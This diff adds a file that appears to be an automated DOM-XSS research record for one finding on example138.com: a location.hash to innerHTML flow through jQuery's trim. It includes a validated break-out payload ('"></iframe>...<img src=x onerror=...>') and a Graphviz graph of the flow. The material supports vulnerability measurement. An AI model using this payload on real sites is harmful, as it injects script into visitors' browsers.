@@ -1,0 +1,84 @@
+// Finding: c1a27846-c23b-4d5b-a4b4-4a5d7fd0589f
+// Finding.url: https://example138.com/solutions/kanban/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('df59c5208d744839bbe0e2d1cc70391b')><!--/*
+// Finding.parentloc: https://example138.com/solutions/kanban/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('df59c5208d744839bbe0e2d1cc70391b')><!--/*
+// Finding.domain: example138.com
+// Finding.base_domain: example138.com
+// Finding.source: location.hash
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: trim
+// Sanitizer.location: https://example138.com/wp-includes/js/jquery/jquery.js - trim:2:3011
+// Finding.begin: 0
+// Finding.end: 121
+// Finding.original_uuid: 06ebb3bd-cfd5-4d9f-9b55-2ee5261eabd1
+// Finding.TwentyFiveMillionFlowsId: 1319747313
+// Finding.script: https://example138.com/wp-includes/js/jquery/jquery.js
+// Finding.line: 3
+// Exploit.uuid: df59c520-8d74-4839-bbe0-e2d1cc70391b
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: value
+// Exploit.quote_type: "
+// Exploit.tag: param
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 37
+// Exploit.replace_begin_url: 37
+// Exploit.replace_end_url: 37
+// Exploit.replace_begin_param: 743
+// Exploit.replace_end_param: 743
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 2085588375
+// DepGraph.sanitizer_hash: 1404511302
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 1"];
+n4 [shape=ellipse, label="."];
+n5 [shape=box, label="Lit: .plan-table__item-price[data-pricing-payment=""];
+n6 [shape=ellipse, label="."];
+n7 [shape=box, label="Lit: "]"];
+n8 [shape=ellipse, label="preg_replace"];
+n9 [shape=box, label="RegExp: /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/"];
+n10 [shape=box, label="Lit: "];
+n11 [shape=box, label="Var: x"];
+n12 [shape=box, label="Var: x"];
+n13 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n4 -> n5;
+n4 -> n1;
+n6 -> n4;
+n6 -> n7;
+n11 -> n6;
+n8 -> n9;
+n8 -> n10;
+n8 -> n11;
+n12 -> n8;
+n13 -> n12;
+}
